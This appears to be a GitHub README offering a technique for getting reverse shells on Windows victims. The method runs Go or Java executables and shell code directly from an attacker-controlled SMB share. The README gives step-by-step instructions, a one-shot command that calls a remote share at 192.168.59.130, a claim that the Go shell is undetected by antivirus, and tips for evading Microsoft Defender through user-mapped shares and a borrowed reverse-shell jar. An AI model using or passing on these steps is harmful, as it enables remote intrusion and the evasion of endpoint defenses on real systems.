# One-Shot-Shellz
## Abusing Remote Windows SMB Shares to Get Reverse Shells In ~~Any~~ Some Programming Languages

This is my collection of ways to Execute Reverse Shells on a Victim Windows Host not using PowerShell or touching disk with an .exe.

More will be added as and when I have the time to research it.

Programming Languages Tested With

1. [Go](#Go)
2. [Java](#example-with-java)


## <a name="Go"></a>The process is extremely simple - Example with Go

1. Have a Windows Victim where you can run commands
2. Have a Windows Attack Box with your Programming Environment of choice - Python Java and Go are the only ones I have tested so far
3. Have a Kali Box or NCat on your Windows Attack Box to catch the Reverse Shell
4. Share the Folder where your Python/Java/Go.exe Application is
5. Have your Reverse Shell script also in the same folder
6. Run your one shot command in CMD/PowerShell i.e with Go it is `\\192.168.59.130\Go\go.exe run \\192.168.59.130\Go\shell.go` where `\\192.168.59.130\Go\` is the Attacker Controlled Remote Share and `run` for `go run` and `\\192.168.59.130\Go\shell.go` is the Reverse Shell Code.

  ![image](https://user-images.githubusercontent.com/130473605/235157805-16805cb8-0019-44a7-acb2-4717a273c60a.png)


7. Sit back and execute Go on a Windows Victim Host that doesnt have it installed.

**NB - Give it time, can take a while to drop in**

![image](https://user-images.githubusercontent.com/130473605/235159127-c5551ddd-07b3-408e-baa7-ec45869b56ab.png)

**NBNB - shell.go is FUD @ 28/04/2023**

![image](https://user-images.githubusercontent.com/130473605/235163241-a43353c0-f538-4b6b-ad3e-4943631242ec.png)


## Defender

According to the Windows Documentation, Defender wont scan User-Level Mapped Shares i.e if you use `net use g: \\192.168.59.60\Go /USER:user Password!` it wont scan and therefore wont attempt to delete the files on the remote share. It can however pick a script up when attempting to execute. Network Shares are scanned. Just something to keep in mind. https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-advanced-scan-types-microsoft-defender-antivirus?view=o365-worldwide

![image](https://user-images.githubusercontent.com/130473605/235164338-683ff6a4-e68d-4b53-9d40-d1a274310c1f.png)

## <a name="Java"></a>Example with Java

1. Download and Install JRE 
2. Share /bin folder - C:\Program Files\Java\jre-1.8\bin
3. Download Reverse-Shell.jar and place in /bin folder - Stolen from https://github.com/ivan-sincek/java-reverse-tcp/blob/main/jar/Reverse_Shell.jar
4. Execute java and jar file whilst bypassing Defender

![image](https://user-images.githubusercontent.com/130473605/235175752-b3b26e3d-5f12-4052-a124-a498cc28a8c8.png)

5. Enjoy a Java Reverse Shell from a Windows Host that doesnt have Java Installed

![image](https://user-images.githubusercontent.com/130473605/235176177-20c77e58-0a72-49e4-8036-317389f6591d.png)

